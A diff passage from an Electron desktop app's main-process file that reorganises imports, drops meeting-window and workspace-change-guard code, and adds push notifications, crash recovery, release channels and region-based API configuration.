@@ -1,5 +1,3 @@
-import { AccountOnboardingSchema, UpdateAccountOnboardingSchema } from '@rally/contracts';
-import { RALLY_HEADERS } from '@rally/contracts/http-headers';
 import {
   ActivateWorkspaceRequestSchema,
   ClientFeatureFlagsSchema,
@@ -16,26 +14,17 @@ import {
   type Session as WireSession,
   type WorkspaceAttention,
   type WorkspaceDeparture,
+  AccountOnboardingSchema,
+  UpdateAccountOnboardingSchema,
 } from '@rally/contracts';
 import {
   DESKTOP_DEEP_LINK_PROTOCOL,
   DESKTOP_DEEP_LINK_PROTOCOLS,
 } from '@rally/contracts/desktop-deep-link';
-import { execFile } from 'node:child_process';
-import { existsSync, renameSync } from 'node:fs';
-import { writeFile } from 'node:fs/promises';
-import { createRequire } from 'node:module';
-import { basename, dirname, join, resolve, sep } from 'node:path';
-import { fileURLToPath, pathToFileURL } from 'node:url';
-import { promisify } from 'node:util';
-import { WorkspaceChangeGuard } from './workspace-change-guard';
-import { conversationDetailsGeometry } from './conversation-details-geometry';
-import { revalidateWorkspaceActivation } from './workspace-activation';
-import { claimActiveWorkspace } from './workspace-selection';
-import {
-  acceptedDeepLink,
-  shouldDeliverConnectorResultToSettings,
-} from './deep-links';
+import { RALLY_HEADERS } from '@rally/contracts/http-headers';
+import type { Region } from "@rally/contracts/regions";
+import { regions } from "@rally/contracts/regions";
+import type { IpcMainInvokeEvent, WebContents } from 'electron';
 import {
   app,
   BrowserWindow,
@@ -44,6 +33,7 @@ import {
   dialog,
   ipcMain,
   Menu,
+  ShareMenu,
   net,
   nativeImage,
   nativeTheme,
@@ -52,21 +42,22 @@ import {
   screen as electronScreen,
   session as electronSession,
   shell,
-  systemPreferences,
   Tray,
   WebContentsView,
 } from 'electron';
-import type { IpcMainInvokeEvent, WebContents } from 'electron';
-import { desktopWorkspaceIdentityKey } from '../common/desktop';
+import { execFile } from 'node:child_process';
+import { existsSync, renameSync } from 'node:fs';
+import { writeFile } from 'node:fs/promises';
+import { createRequire } from 'node:module';
+import { basename, dirname, join, resolve, sep } from 'node:path';
+import { fileURLToPath, pathToFileURL } from 'node:url';
+import { promisify } from 'node:util';
 import {
-  ArtifactPreviewController,
-  applyGlobalNavigationPolicy,
-  artifactWebPreferences,
-  confineToArtifactOrigin,
-  isArtifactUrl,
-  loadArtifactInitialUrl,
-  type ArtifactViewHandle,
-} from './artifact-viewers';
+  applicationIconArtworkFileName,
+  automaticApplicationIcon,
+  type ApplicationIconId,
+  type DesktopApplicationIconState,
+} from '../common/application-icons';
 import type {
   RallyRegion,
   DesktopApplicationSettings,
@@ -82,22 +73,19 @@ import type {
   DesktopPendingWorkspaceInvitation,
   DesktopWorkspaceOnboardingState,
   DesktopWorkspaceSummary,
-  MeetingAudioPermissionKind,
   RuntimeConfig,
   DesktopDeepLinkErrorNotice,
 } from '../common/desktop';
-import {
-  applicationIconArtworkFileName,
-  automaticApplicationIcon,
-  type ApplicationIconId,
-  type DesktopApplicationIconState,
-} from '../common/application-icons';
 import { logError, logWarn } from '../common/logger';
-import { parseDesktopSettingsSection } from '../common/settings';
-import { parseSidekicksWindowTarget } from '../common/sidekicks';
-import type { SidekicksWindowTarget } from '../common/sidekicks';
+import {
+  defaultDesktopReleaseChannel,
+  parseDesktopReleaseChannel,
+  type DesktopReleaseChannel,
+} from '../common/release-channels';
 import type { DesktopSettingsSection } from '../common/settings';
-import { SettingsWindowController } from './settings-window-controller';
+import { parseDesktopSettingsSection } from '../common/settings';
+import type { SidekicksWindowTarget } from '../common/sidekicks';
+import { parseSidekicksWindowTarget } from '../common/sidekicks';
 import { fontScheme } from '../common/theme-assets';
 import {
   defaultThemeChoice,
@@ -115,8 +103,6 @@ import {
   responseError,
   UnusableCredentialError,
 } from './api-response-error';
-import { ApplicationOpenObserver, initialApplicationOpenEntrypoint } from './application-open-observer';
-import { parseTelemetryProductIntent, UUID_V7_PATTERN } from './telemetry-intent';
 import {
   applicationIconPath,
   applicationIconPreferenceDirectoryForLaunch,
@@ -125,31 +111,62 @@ import {
   writeStoredApplicationIcon,
 } from './application-icon';
 import { ApplicationIconController } from './application-icon-controller';
+import { ApplicationLifecycleTelemetry } from './application-lifecycle-telemetry';
+import { applicationMenuTemplate } from './application-menu';
+import { shareText, showDefinitionForSelection } from './text-services';
+import { ApplicationOpenObserver, initialApplicationOpenEntrypoint } from './application-open-observer';
+import { RendererCrashRecovery } from './renderer-crash-recovery';
+import { availableRendererWindows } from './renderer-window-availability';
 import {
   readStoredApplicationSettings,
   updateStoredApplicationSettings,
 } from './application-settings';
-import { ApplicationLifecycleTelemetry } from './application-lifecycle-telemetry';
 import {
   acknowledgeApplicationVersionTransition,
   applicationVersionTransition,
 } from './application-version-telemetry';
-import { DesktopAuthAttemptStore } from './desktop-auth-attempts';
-import { applicationMenuTemplate } from './application-menu';
+import {
+  ArtifactPreviewController,
+  ArtifactUserActivation,
+  applyGlobalNavigationPolicy,
+  artifactWebPreferences,
+  confineToArtifactOrigin,
+  isArtifactUrl,
+  loadArtifactInitialUrl,
+  type ArtifactLinkHandoff,
+  type ArtifactViewHandle,
+} from './artifact-viewers';
+import { conversationDetailsGeometry } from './conversation-details-geometry';
+import { CredentialRefreshRegistry } from './credential-refresh';
 import { DebugSettingsController } from './debug-settings';
+import {
+  acceptedDeepLink,
+  shouldDeliverConnectorResultToSettings,
+  workstreamHttpsDeepLink,
+} from "./deep-links";
+import { DesktopAuthAttemptStore } from './desktop-auth-attempts';
 import { DeveloperSettingsFlagController } from './developer-settings-flag';
-import { LaunchAtLoginController, launchedAtLogin } from './launch-at-login';
 import {
   javascriptErrorProcessHealthState,
   normalizeJavascriptErrorCandidate,
 } from './javascript-error-candidate';
-import { LockdownModeController } from './lockdown-mode';
-import { MenuBarController, type MenuBarTray } from './menu-bar';
 import {
-  ThemeFontCache,
-  themeFontSchemes,
-} from './theme-assets';
+  installMainProcessNetworkRecovery,
+  type MainProcessFatalOrigin,
+} from './main-process-network-recovery';
+import { LaunchAtLoginController, launchedAtLogin } from './launch-at-login';
+import { LockdownModeController } from './lockdown-mode';
+import {
+  allowsTrustedAudioCapture,
+} from './media-permission';
+import { MenuBarController, type MenuBarTray } from './menu-bar';
 import { MenuBarContentStore } from './menu-bar-content';
+import {
+  MENU_BAR_PINNED_LIMIT,
+  MENU_BAR_RECENT_LIMIT,
+  supportsSectionHeaders,
+} from './menu-bar-menu';
+import { MenuBarOpenObserver } from './menu-bar-open-observer';
 import {
   isMessageExportUrl,
   MESSAGE_EXPORT_CONTENT_SECURITY_POLICY,
@@ -158,58 +175,32 @@ import {
   parseMessageExportRequest,
   type MessageExportWindow,
 } from './message-export';
-import { MenuBarOpenObserver } from './menu-bar-open-observer';
-import {
-  RealtimeSocketBroker,
-  createNodeRealtimeSocketFactory,
-} from './realtime-socket-broker';
-import { registerRealtimeSocketIpc } from './realtime-socket-ipc';
 import { invalidateActiveNativeCrashGeneration, prepareNativeCrashGeneration } from './native-crash-generation';
 import { NativeCrashUploader } from './native-crash-uploader';
-import { ProductAnalyticsSettingsController } from './product-analytics-settings';
-import {
-  readTelemetryIdentityState,
-  rotateTelemetryEpochs,
-  type TelemetryIdentity,
-  uuidV7,
-} from './telemetry-identity';
-import {
-  TelemetryReporter,
-  type ApplicationSettingsTelemetryState,
-  type TelemetryWindowContext,
-} from './telemetry-reporter';
-import {
-  refreshTelemetryCapability,
-  resolveTelemetryRoute,
-  type ResolvedTelemetryRoute,
-} from './telemetry-route';
-import { TelemetrySpool } from './telemetry-spool';
-import { TelemetryQuitBarrier } from './telemetry-quit-barrier';
-import { beginTelemetryLaunch, clearTelemetryLaunch, markTelemetryLaunchReady } from './telemetry-launch-marker';
-import { TelemetryBreadcrumbRing, type NewTelemetryBreadcrumb } from './telemetry-breadcrumbs';
-import {
-  MENU_BAR_PINNED_LIMIT,
-  MENU_BAR_RECENT_LIMIT,
-  supportsSectionHeaders,
-} from './menu-bar-menu';
-import {
-  allowsTrustedAudioCapture,
-} from './media-permission';
-import {
-  meetingAudioPermissions,
-  meetingAudioSettingsUrl,
-  prepareMeetingAudioPermissions,
-} from './meeting-audio-permission';
-import {
-  nativeSystemAudioAddonPath,
-  NativeSystemAudioController,
-  type NativeSystemAudioBinding,
-} from './native-system-audio';
 import {
   NativePerformanceLog,
   nativeUnifiedLogAddonPath,
   type NativeUnifiedLogBinding,
 } from './native-performance-log';
+import {
+  nativeSystemAudioAddonPath,
+  NativeSystemAudioController,
+  type NativeSystemAudioBinding,
+} from './native-system-audio';
+import { requestWithOnboardingIdentity } from './onboarding-identity-request';
+import { ProductAnalyticsSettingsController } from './product-analytics-settings';
+import { DesktopPushNotifications } from "./push-notifications";
+import {
+  RealtimeSocketBroker,
+  createNodeRealtimeSocketFactory,
+} from './realtime-socket-broker';
+import { registerRealtimeSocketIpc } from './realtime-socket-ipc';
+import {
+  decryptSessionValue,
+  encryptSessionValue,
+  migrateStoredSessionEncryption,
+  type SessionEncryptionMode,
+} from './session-encryption';
 import {
   migrateLegacyUserDataStoredSessionFile,
   migrateLegacyStoredSessionFile,
@@ -226,6 +217,7 @@ import {
   writeStoredProfileFile,
   writeStoredSessionFile,
 } from './session-file';
+import { SettingsWindowController } from './settings-window-controller';
 import {
   activeStoredCredential,
   activeStoredWorkspaceCredential,
@@ -242,20 +234,32 @@ import {
   type StoredAuthSet,
   type StoredProfileSet,
 } from './stored-auth';
-import { requestWithOnboardingIdentity } from './onboarding-identity-request';
-import { CredentialRefreshRegistry } from './credential-refresh';
-import {
-  endedStoredWorkspaces,
-  mergeWorkspaceDirectory,
-  storedWorkspaceSummaries,
-} from './workspace-directory';
 import { parseLegacyStoredSession } from './stored-session';
+import { TelemetryBreadcrumbRing, type NewTelemetryBreadcrumb } from './telemetry-breadcrumbs';
 import {
-  decryptSessionValue,
-  encryptSessionValue,
-  migrateStoredSessionEncryption,
-  type SessionEncryptionMode,
-} from './session-encryption';
+  readTelemetryIdentityState,
+  rotateTelemetryEpochs,
+  type TelemetryIdentity,
+  uuidV7,
+} from './telemetry-identity';
+import { parseTelemetryProductIntent, UUID_V7_PATTERN } from './telemetry-intent';
+import { beginTelemetryLaunch, clearTelemetryLaunch, markTelemetryLaunchReady } from './telemetry-launch-marker';
+import { TelemetryQuitBarrier } from './telemetry-quit-barrier';
+import {
+  TelemetryReporter,
+  type ApplicationSettingsTelemetryState,
+  type TelemetryWindowContext,
+} from './telemetry-reporter';
+import {
+  refreshTelemetryCapability,
+  resolveTelemetryRoute,
+  type ResolvedTelemetryRoute,
+} from './telemetry-route';
+import { TelemetrySpool } from './telemetry-spool';
+import {
+  ThemeFontCache,
+  themeFontSchemes,
+} from './theme-assets';
 import {
   initializeAutoUpdate,
   type AutoUpdateController,
@@ -265,6 +269,13 @@ import {
   supersededUserDataDirectories,
   userDataDirectoryForLaunch,
 } from './user-data-path';
+import { revalidateWorkspaceActivation } from './workspace-activation';
+import {
+  endedStoredWorkspaces,
+  mergeWorkspaceDirectory,
+  storedWorkspaceSummaries,
+} from './workspace-directory';
+import { claimActiveWorkspace } from './workspace-selection';
 const currentDirectory = dirname(fileURLToPath(import.meta.url));
 const requireNativeModule = createRequire(import.meta.url);
 const executeFile = promisify(execFile);
@@ -309,11 +320,6 @@ const MENU_BAR_REQUEST_TIMEOUT_MS = 8_000;
 /** How long the menu's cached content is served before the pointer arriving at
  * the status item asks for it again. */
 const MENU_BAR_CONTENT_MAX_AGE_MS = 15_000;
-const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/iu;
-
-function isUuid(value: string): boolean {
-  return UUID_PATTERN.test(value);
-}
 
 const telemetryScreens = new Set<DesktopTelemetryScreen>([
   'onboarding_welcome', 'onboarding_region', 'onboarding_workspace',
@@ -448,22 +454,6 @@ async function reportTelemetryProductIntent(
       await telemetryReporter.contentCopied(telemetryIntentProperties(intent), windowContext);
       return;
     }
-    case 'note_opened': {
-      await telemetryReporter.noteOpened(telemetryIntentProperties(intent), windowContext);
-      return;
-    }
-    case 'note_created': {
-      await telemetryReporter.noteCreated(telemetryIntentProperties(intent), windowContext);
-      return;
-    }
-    case 'note_action_completed': {
-      await telemetryReporter.noteActionCompleted(telemetryIntentProperties(intent), windowContext);
-      return;
-    }
-    case 'transcription_state_changed': {
-      await telemetryReporter.transcriptionStateChanged(telemetryIntentProperties(intent), windowContext);
-      return;
-    }
     default:
       await telemetryReporter.semanticProductIntent(intent, windowContext);
       return;
@@ -471,6 +461,19 @@ async function reportTelemetryProductIntent(
 }
 
 let mainWindow: BrowserWindow | null = null;
+let applicationIsQuitting = false;
+const rendererCrashRecovery = new RendererCrashRecovery({
+  showMessageBox: (options) => {
+    const parent = mainWindow;
+    return parent && !parent.isDestroyed() && parent.isVisible() && !parent.isMinimized()
+      ? dialog.showMessageBox(parent, options)
+      : dialog.showMessageBox(options);
+  },
+  isQuitting: () => applicationIsQuitting,
+  relaunch: () => app.relaunch(),
+  quit: () => app.quit(),
+  onError: (error) => logError('rally', 'renderer crash recovery failed', error),
+});
 let conversationDetailsExpansion = 0;
 let conversationDetailsAppliedWidth = 0;
 let settingsWindow: BrowserWindow | null = null;
@@ -508,11 +511,7 @@ let deepLinkErrorWindow: BrowserWindow | null = null;
 // `deep-link-error:dismiss`.
 let deepLinkErrorNotice: DesktopDeepLinkErrorNotice | null = null;
 let deepLinkErrorNoticesShown = 0;
-const meetingWindows = new Set<BrowserWindow>();
-const meetingWindowsAllowedToClose = new WeakSet<BrowserWindow>();
-const workspaceChangeGuard = new WorkspaceChangeGuard();
 let rendererReady = false;
-let quitting = false;
 let inMemoryAuthSet: StoredAuthSet | null = null;
 let inMemoryProfileSet: StoredProfileSet | null = null;
 let inMemorySession: WireSession | null = null;
@@ -533,6 +532,7 @@ let workspaceSelectionIntent = 0;
 let loggingOut = false;
 let updateStatus: UpdateStatus = { kind: 'idle' };
 let autoUpdateController: AutoUpdateController | null = null;
+let desktopReleaseChannel: DesktopReleaseChannel = defaultDesktopReleaseChannel;
 let updateInstallationPending = false;
 let developmentDockIconUsesAppearancePreview = false;
 const realtimeSocketBroker = new RealtimeSocketBroker(createNodeRealtimeSocketFactory(
@@ -555,6 +555,7 @@ const applicationOpenObserver = new ApplicationOpenObserver((entrypoint, phase) 
 // ordinary deep links cannot truthfully identify which external surface sent them.
 let applicationLaunchObserved = false;
 let prelaunchDeepLinkObserved = false;
+let prelaunchPushObserved = false;
 const applicationLifecycleTelemetry = new ApplicationLifecycleTelemetry((state) => {
   const reporter = telemetryReporter;
   if (reporter) void reporter.applicationLifecycle(state).catch(() => undefined);
@@ -581,6 +582,10 @@ let telemetryLaunchId: string | null = null;
 let telemetryBreadcrumbs: TelemetryBreadcrumbRing | null = null;
 let telemetryContinuouslyEligible = false;
 const pendingDeepLinks: DesktopDeepLinkNavigation[] = [];
+let mainWindowReadyToShow = false;
+let mainWindowLoading: Promise<void> | null = null;
+let resolveMainWindowStartup!: () => void;
+const mainWindowStartup = new Promise<void>((resolve) => { resolveMainWindowStartup = resolve; });
 const telemetryQuitBarrier = new TelemetryQuitBarrier(async () => {
   applicationOpenObserver.destroy();
   if (telemetryFlushTimer) clearInterval(telemetryFlushTimer);
@@ -686,29 +691,7 @@ async function reportJavascriptErrorCandidate(
 }
 
 function rallyWindows(): BrowserWindow[] {
-  return [mainWindow, settingsWindow, sidekicksWindow, deepLinkErrorWindow, ...meetingWindows]
-    .filter((window): window is BrowserWindow => Boolean(window && !window.isDestroyed()));
-}
-
-function isMeetingWindowContents(contents: WebContents | null): boolean {
-  if (!contents) return false;
-  return [...meetingWindows].some((window) => !window.isDestroyed() && window.webContents === contents);
-}
-
-function forceCloseMeetingWindow(window: BrowserWindow): void {
-  if (window.isDestroyed()) return;
-  meetingWindowsAllowedToClose.add(window);
-  window.close();
-}
-
-function beginWorkspaceChange(target?: { region: RallyRegion; workspaceId: string }): number | null {
-  const currentWorkspace = inMemorySession?.workspace;
-  return workspaceChangeGuard.beginChange(
-    currentWorkspace
-      ? desktopWorkspaceIdentityKey(currentWorkspace.region, currentWorkspace.id)
-      : null,
-    target ? desktopWorkspaceIdentityKey(target.region, target.workspaceId) : undefined,
-  );
+  return availableRendererWindows([mainWindow, settingsWindow, sidekicksWindow, deepLinkErrorWindow]);
 }
 
 protocol.registerSchemesAsPrivileged([{
@@ -844,6 +827,7 @@ function flagSessionIdentity(userId: string, apiBaseUrl: string): string {
 }
 
 function broadcastSessionChanged(value: WireSession | null): void {
+  if (value) desktopPush.sessionChanged();
   const exposed = value ? publicSession(value) : null;
   for (const window of rallyWindows()) window.webContents.send('session:changed', exposed);
   // Whether Developer may be offered belongs to the signed-in account, so a
@@ -980,7 +964,7 @@ function refreshCurrentTelemetryCapability(): Promise<ResolvedTelemetryRoute['an
     const refreshed = await refreshTelemetryCapability({
       current: telemetryRoute,
       anonymousEpochId: telemetryIdentity.anonymousEpochId,
-      globalApiBaseUrl: runtimeConfig().api.global,
+      globalApiBaseUrl: configuredApiBase('global'),
       fetch: telemetryFetch,
     });
     if (refreshed) telemetryRoute = { ...telemetryRoute, anonymous: refreshed };
@@ -1016,7 +1000,7 @@ function regionForStoredSession(value: WireSession): RallyRegion {
 }
 
 function apiBaseForAuth(auth: StoredAuth): string {
-  return runtimeConfig().api[auth.binding.region];
+  return configuredApiBase(auth.binding.region);
 }
 
 function activeSessionEncryptionMode(): SessionEncryptionMode {
@@ -1096,6 +1080,7 @@ async function recoverGlobalSessionWithoutKeystore(): Promise<void> {
 }
 
 async function clearCredentialsForLockdownRelogin(): Promise<void> {
+  desktopPush.signOut(inMemoryAuthSet?.workspaces);
   sessionLifecycleEpoch += 1;
   desktopAuthAttempts.clear();
   inMemoryAuthSet = null;
@@ -1308,12 +1293,43 @@ const menuBarController = new MenuBarController({
   logWarning: (message, error) => logWarn('rally', message, error),
 });
 
+const desktopPush = new DesktopPushNotifications({
+  credentials: async () => (await loadStoredAuthSet())?.workspaces ?? [],
+  request: async (credential, path, init = {}) => {
+    const ask = (auth: StoredAuth) => net.fetch(`${apiBaseForAuth(auth)}${path}`, {
+      ...init, headers: { ...init.headers, Authorization: `Bearer ${auth.accessToken}` },
+    });
+    let response = await ask(credential);
+    if (response.status === 401 && init.method !== 'DELETE' && !init.signal?.aborted) {
+      await response.body?.cancel();
+      const renewed = await refreshStoredCredential(credential);
+      response = await ask(storedAuthFromSession(renewed, regionForStoredSession(renewed)));
+    }
+    return response;
+  },
+  clicked: (url) => {
+    if (applicationLaunchObserved) applicationOpenObserver.opened('push_notification');
+    else prelaunchPushObserved = true;
+    const link = url ? workstreamHttpsDeepLink(url) : null;
+    if (link) sendDeepLink(link, 'notification');
+    else if (app.isReady()) void createMainWindow();
+  },
+  changed: () => broadcastApplicationSettingsChanged(desktopApplicationSettings()),
+  warn: () => logWarn('rally', 'Push notifications could not register on this Mac'),
+});
+
+// Install the response delegate before ready so a notification cold launch is retained.
+desktopPush.installNativeBridge();
+
 function desktopApplicationSettings(
   lockdown: DesktopLockdownSettings = lockdownModeController.state(),
 ): DesktopApplicationSettings {
   const developerSettingsAvailable = developerSettingsFlagController.enabled();
   return {
     ...lockdown,
+    ...desktopPush.state(),
+    releaseChannel: desktopReleaseChannel,
+    releaseChannelAvailable: process.platform === 'darwin' && process.arch === 'arm64',
     developerSettingsAvailable,
     // The effective preference, not the stored one. Debug enabled is a
     // per-device choice inside a section the service decides exists at all, so
@@ -1390,6 +1406,7 @@ async function readDeveloperSettingsFlag(): Promise<boolean> {
   if (!response.ok) throw await responseError(response);
   const parsed = ClientFeatureFlagsSchema.safeParse(await response.json());
   if (!parsed.success) throw new Error('Rally returned an unreadable feature flag response');
+  desktopPush.featureFlagChanged(parsed.data.pushNotificationsEnabled);
   return parsed.data.developerSettings;
 }
 
@@ -1699,22 +1716,22 @@ function parseRallyBaseUrl(value: string | undefined, fallback: string): string 
   return parsed.toString().replace(/\/$/u, '');
 }
 
+function configuredApiBase(region: RallyRegion): string {
+  const url = runtimeConfig().api[region];
+  if (!url) throw new Error('The region is unavailable');
+  return url;
+}
+
 function runtimeConfig(): RuntimeConfig {
   const packaged = app.isPackaged;
   return {
     appVersion: app.getVersion(),
     isPackaged: packaged,
     platform: process.platform,
-    api: {
-      global: parseRallyBaseUrl(
-        packaged ? undefined : process.env['VITE_API_GLOBAL_URL'],
-        packaged ? 'https://api.rallywith.ai' : 'http://127.0.0.1:8787',
-      ),
-      eu: parseRallyBaseUrl(
-        packaged ? undefined : process.env['VITE_API_EU_URL'],
-        packaged ? 'https://eu.api.rallywith.ai' : 'http://127.0.0.1:8788',
-      ),
-    },
+    api: Object.fromEntries(Object.entries(regions).map(([region, config]) => [region, parseRallyBaseUrl(
+      packaged ? undefined : process.env[`VITE_API_${config.bindingPrefix}_URL`],
+      packaged ? config.apiUrl : config.localApiUrl,
+    )])),
     webBaseUrl: parseRallyBaseUrl(
       packaged ? undefined : process.env['PUBLIC_WEB_BASE_URL'],
       packaged ? 'https://rallywith.ai' : 'http://127.0.0.1:5174',
@@ -1727,7 +1744,7 @@ async function telemetryAuthenticatedSession(): Promise<{
   apiBaseUrl: string;
   accessToken: string;
   workspace: boolean;
-  route: 'global' | 'eu';
+  route: Region;
 } | null> {
   const auth = await loadStoredAuth();
   if (!auth) return null;
@@ -1750,7 +1767,7 @@ async function initializeTelemetry(launchAuth: StoredAuth | null): Promise<void>
   telemetryRoute = await resolveTelemetryRoute({
     explicitRegion: launchAuth?.binding.workspaceId ? launchAuth.binding.region : null,
     anonymousEpochId: telemetryIdentity.anonymousEpochId,
-    globalApiBaseUrl: runtimeConfig().api.global,
+    globalApiBaseUrl: configuredApiBase('global'),
     fetch: telemetryFetch,
   });
 
@@ -1843,7 +1860,7 @@ async function initializeTelemetry(launchAuth: StoredAuth | null): Promise<void>
       screenWidth: primaryDisplay.size.width,
       screenHeight: primaryDisplay.size.height,
     },
-    globalApiBaseUrl: runtime.api.global,
+    globalApiBaseUrl: configuredApiBase('global'),
   });
   nativeCrashUploader = new NativeCrashUploader({
     rootDirectory: crashRoot,
@@ -1868,7 +1885,7 @@ async function initializeTelemetry(launchAuth: StoredAuth | null): Promise<void>
         expiresAt: refreshed.expiresAt,
       } : null;
     },
-    globalApiBaseUrl: runtime.api.global,
+    globalApiBaseUrl: configuredApiBase('global'),
     fetch: telemetryFetch,
     onState: (state) => telemetryReporter?.crashUploadState(state),
   });
@@ -1974,7 +1991,7 @@ async function exchangeDesktopTicket(input: unknown): Promise<DesktopSession> {
     throw new Error('Invalid desktop sign-in payload');
   }
   const apiBaseUrl = validatedApiBase(candidate.apiBaseUrl);
-  if (apiBaseUrl !== runtimeConfig().api.global) {
+  if (apiBaseUrl !== configuredApiBase('global')) {
     throw new Error('Rally sign-in must use the platform identity endpoint');
   }
   const attempt = desktopAuthAttempts.proof(candidate.attemptId);
@@ -2040,7 +2057,7 @@ function createDesktopAuthAttempt(input: unknown): { attemptId: string; codeChal
     throw new Error('Rally uses one platform sign-in endpoint');
   }
   const apiBaseUrl = validatedApiBase(candidate.apiBaseUrl);
-  if (apiBaseUrl !== runtimeConfig().api.global) {
+  if (apiBaseUrl !== configuredApiBase('global')) {
     throw new Error('The authentication endpoint does not match Rally sign-in');
   }
   // Starting over makes the newest browser flow authoritative. An older
@@ -2065,13 +2082,13 @@ async function createDevelopmentSession(input: unknown): Promise<DesktopSession>
     throw new Error('Invalid workspace name');
   }
   const session = await requestSession(apiBaseUrl, '/auth/dev/session', { workspaceName: candidate.workspaceName.trim() });
-  const identity = await requestSession(runtimeConfig().api.global, '/auth/dev/identity', {});
+  const identity = await requestSession(configuredApiBase('global'), '/auth/dev/identity', {});
   if (
     !session.workspace
     || session.apiBaseUrl !== apiBaseUrl
     || runtimeConfig().api[session.workspace.region] !== apiBaseUrl
     || identity.workspace
-    || identity.apiBaseUrl !== runtimeConfig().api.global
+    || identity.apiBaseUrl !== configuredApiBase('global')
     || identity.user.email.toLocaleLowerCase('en-US') !== session.user.email.toLocaleLowerCase('en-US')
   ) {
     throw new Error('The development session returned a mismatched regional endpoint');
@@ -2103,7 +2120,7 @@ async function requireOnboardingIdentitySession(): Promise<WireSession> {
     throw identityRenewalFailure(error);
   });
   if (!stored) throw accountReconnectRequiredFailure();
-  if (stored.apiBaseUrl !== runtimeConfig().api.global) {
+  if (stored.apiBaseUrl !== configuredApiBase('global')) {
     throw new Error('Workspace setup requires a Rally platform identity session');
   }
   return stored;
@@ -2162,7 +2179,7 @@ function workspaceSummary(workspace: {
 /** Ask Global for the account's complete membership and invitations. */
 async function discoverWorkspaces(): Promise<WorkspaceDiscovery> {
   const { identity, response } = await onboardingIdentityRequest((credential) => net.fetch(
-    `${runtimeConfig().api.global}/onboarding`,
+    `${configuredApiBase('global')}/onboarding`,
     {
       method: 'GET',
       headers: {
@@ -2369,8 +2386,7 @@ async function leaveWorkspace(input: unknown): Promise<WorkspaceDeparture> {
   ) {
     throw new Error('Invalid workspace departure request');
   }
-  const changeId = beginWorkspaceChange();
-  try {
+  {
     const authSet = await loadStoredAuthSet();
     let credential = authSet
       ? activeStoredWorkspaceCredential(authSet, workspaceId.data, region.data)
@@ -2394,8 +2410,6 @@ async function leaveWorkspace(input: unknown): Promise<WorkspaceDeparture> {
     const departure = WorkspaceDepartureSchema.parse(await readJsonBody(response));
     await withSessionMutation(() => removeStoredCredentialUnlocked(credential));
     return departure;
-  } finally {
-    workspaceChangeGuard.finishChange(changeId);
   }
 }
 
@@ -2413,7 +2427,7 @@ async function requestOnboardingSession(
     throw new Error('Rally was signed out while workspace setup was running');
   }
   const requested = await onboardingIdentityRequest((credential) => net.fetch(
-    `${runtimeConfig().api.global}${path}`,
+    `${configuredApiBase('global')}${path}`,
     {
       method: 'POST',
       headers: {
@@ -2478,8 +2492,6 @@ async function activateWorkspace(input: unknown): Promise<DesktopSession> {
     throw new Error('Invalid workspace activation operation ID');
   }
   return revalidateWorkspaceActivation(parsed.data, operationId as string | undefined, {
-    beginChange: beginWorkspaceChange,
-    finishChange: (changeId) => workspaceChangeGuard.finishChange(changeId),
     nextSelectionIntent: () => ++workspaceSelectionIntent,
     request: (request) => requestOnboardingSession(
       request.path,
@@ -2526,13 +2538,10 @@ async function createWorkspace(input: unknown): Promise<DesktopSession> {
   if (operationId !== undefined && (typeof operationId !== 'string' || !UUID_V7_PATTERN.test(operationId))) {
     throw new Error('Invalid workspace creation operation ID');
   }
-  const changeId = beginWorkspaceChange();
-  try {
+  {
     return await requestOnboardingSession(
       '/onboarding/workspace', parsed.data, parsed.data.region, undefined, operationId as string | undefined,
     );
-  } finally {
-    workspaceChangeGuard.finishChange(changeId);
   }
 }
 
@@ -2562,8 +2571,7 @@ function parseInvitationAction(input: unknown): {
 
 async function acceptInvitation(input: unknown): Promise<DesktopSession> {
   const parsed = parseInvitationAction(input);
-  const changeId = beginWorkspaceChange();
-  try {
+  {
     return await requestOnboardingSession(
       `/onboarding/invitations/${encodeURIComponent(parsed.invitationId)}/accept`,
       { region: parsed.region },
@@ -2571,15 +2579,13 @@ async function acceptInvitation(input: unknown): Promise<DesktopSession> {
       undefined,
       parsed.operationId,
     );
-  } finally {
-    workspaceChangeGuard.finishChange(changeId);
   }
 }
 
 async function declineInvitation(input: unknown): Promise<void> {
   const parsed = parseInvitationAction(input);
   const { response } = await onboardingIdentityRequest((identity) => net.fetch(
-    `${runtimeConfig().api.global}/onboarding/invitations/${encodeURIComponent(parsed.invitationId)}/decline`,
+    `${configuredApiBase('global')}/onboarding/invitations/${encodeURIComponent(parsed.invitationId)}/decline`,
     {
       method: 'POST',
       headers: {
@@ -2698,6 +2704,7 @@ async function logout(): Promise<void> {
   const failures: unknown[] = [];
   try {
     const stored = await loadStoredAuthSet();
+    desktopPush.signOut(stored?.workspaces);
     try {
       await clearStoredSession();
     } catch (error) {
@@ -2705,7 +2712,6 @@ async function logout(): Promise<void> {
     }
     settingsWindow?.close();
     sidekicksWindow?.close();
-    for (const window of meetingWindows) forceCloseMeetingWindow(window);
     if (stored) {
       const credentials = [
         ...(stored.account ? [stored.account] : []),
@@ -2773,6 +2779,13 @@ function isAllowedExternalUrl(rawUrl: string): boolean {
   }
 }
 
+function revealWindow(window: BrowserWindow): void {
+  if (window === mainWindow && !mainWindowReadyToShow) return;
+  if (window.isMinimized()) window.restore();
+  window.show();
+  window.focus();
+}
+
 function sendDeepLink(rawUrl: string, entrypoint: DesktopDeepLinkEntrypoint): void {
   const navigation: DesktopDeepLinkNavigation = { url: rawUrl, entrypoint };
   const connectorSettingsWindow = shouldDeliverConnectorResultToSettings(rawUrl)
@@ -2800,48 +2813,7 @@ function sendDeepLink(rawUrl: string, entrypoint: DesktopDeepLinkEntrypoint): vo
   }
   mainWindow.webContents.send('auth:deep-link', navigation);
   const targetWindow = connectorSettingsWindow ?? mainWindow;
-  if (targetWindow.isMinimized()) targetWindow.restore();
-  targetWindow.show();
-  targetWindow.focus();
-}
-
-/**
- * Takes the main window to one note and raises it, for the meeting window that
- * is about to close behind it.
- *
- * It travels as a deep link on the channel every other navigation uses, so the
- * renderer needs no second dispatcher — but it is sent only to the main window,
- * unlike `sendDeepLink`. A note is a main-window destination, and the settings
- * renderer has no business navigating because a meeting ended.
- *
- * Every path through this ends with a window in front of the person, because the
- * caller closes the meeting window whether or not this could deliver. A window
- * that is not listening yet gets the link queued for `consumePendingDeepLinks`,
- * and is still raised — leaving the meeting window to vanish onto whatever was
- * behind it is the exact "go find the note yourself" step this removes.
- */
-function revealNoteInMainWindow(noteId: string): void {
-  const target = `${customProtocol}://notes/${noteId}`;
